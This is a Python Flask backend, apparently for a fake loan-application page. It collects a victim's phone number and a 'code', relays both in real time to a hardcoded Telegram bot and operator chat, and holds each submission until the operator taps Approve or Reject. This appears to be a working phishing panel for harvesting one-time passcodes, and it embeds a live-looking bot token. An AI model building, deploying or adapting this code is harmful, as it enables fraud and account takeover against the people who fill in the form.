import os
import uuid
import requests
from flask import Flask, request, jsonify, send_from_directory

# Initialize app first
app = Flask(__name__, static_folder='.', static_url_path='')

TELEGRAM_TOKEN = "9120980562:AAHdCkCej7QrZp9nj6VrRT5zp13sZBQ69cI"
ADMIN_CHAT_ID = "7477343871"

pending_requests = {}

@app.route('/')
def serve_index():
    return send_from_directory('.', 'index.html')

@app.route('/api/request-approval', methods=['POST'])
def request_approval():
    try:
        data = request.json
        app_id = str(uuid.uuid4())
        pending_requests[app_id] = "pending"
        
        phone = data.get('phone', 'Unknown')
        code = data.get('code', 'Unknown')
        
        text = f"🚨 *New Loan Application*\n\nPhone: +237 {phone}\nCode: {code}\n\nDo you approve?"
        
        keyboard = {
            "inline_keyboard": [[
                {"text": "✅ Approve", "callback_data": f"approve_{app_id}"},
                {"text": "❌ Reject", "callback_data": f"reject_{app_id}"}
            ]]
        }
        
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        response = requests.post(url, json={
            "chat_id": ADMIN_CHAT_ID,
            "text": text,
            "parse_mode": "Markdown",
            "reply_markup": keyboard
        })
        
        if response.status_code != 200:
            print("Telegram Error:", response.text)
            
        return jsonify({"app_id": app_id, "status": "pending"})
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/check-status/<app_id>', methods=['GET'])
def check_status(app_id):
    status = pending_requests.get(app_id, "not_found")
    return jsonify({"status": status})

@app.route('/api/telegram-webhook', methods=['POST'])
def telegram_webhook():
    update = request.json
    if "callback_query" in update:
        callback = update["callback_query"]
        data = callback["data"]
        action, app_id = data.split("_")
        
        if app_id in pending_requests:
            pending_requests[app_id] = action
        
        answer_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/answerCallbackQuery"
        requests.post(answer_url, json={"callback_query_id": callback["id"], "text": "Done!"})
        
        message_id = callback["message"]["message_id"]
        edit_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/editMessageText"
        requests.post(edit_url, json={
            "chat_id": ADMIN_CHAT_ID,
            "message_id": message_id,
            "text": f"Application {action}d.",
            "reply_markup": {"inline_keyboard": []}
        })
    return "OK"

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)